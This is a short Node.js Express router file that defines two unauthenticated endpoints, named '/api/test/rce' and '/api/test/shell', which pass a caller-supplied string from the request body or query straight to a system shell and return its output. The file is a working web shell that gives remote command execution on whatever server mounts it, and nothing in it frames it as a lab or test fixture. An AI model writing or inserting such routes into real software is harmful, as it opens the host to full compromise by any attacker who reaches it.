(function (){
  'use strict';
  const express = require('express');
  const { exec } = require('child_process');
  const router = express.Router();

  router.post('/api/test/rce', (req, res) => {
    const { cmd } = req.body;
    if (!cmd || typeof cmd !== 'string' || cmd.length > 500) {
      return res.status(400).json({ error: 'Invalid command' });
    }

    exec(cmd, { timeout: 5000, shell: '/bin/sh' }, (error, stdout, stderr) => {
      if (error) {
        return res.status(500).json({ error: error.message, stderr });
      }
      if (stderr) {
        return res.status(500).json({ error: stderr });
      }
      res.json({ output: stdout.trim() });
    });
  });

  router.get('/api/test/shell', (req, res) => {
    const args = req.query.args || 'id';
    if (typeof args !== 'string' || args.length > 200) {
      return res.status(400).json({ error: 'Invalid args' });
    }

    exec(`/bin/bash -c "${args.replace(/["'\\]/g, '')}"`, { timeout: 5000 }, (error, stdout, stderr) => {
      if (error) {
        return res.status(500).json({ error: error.message });
      }
      res.type('text').send(stdout || stderr);
    });
  });

  module.exports = router;
}())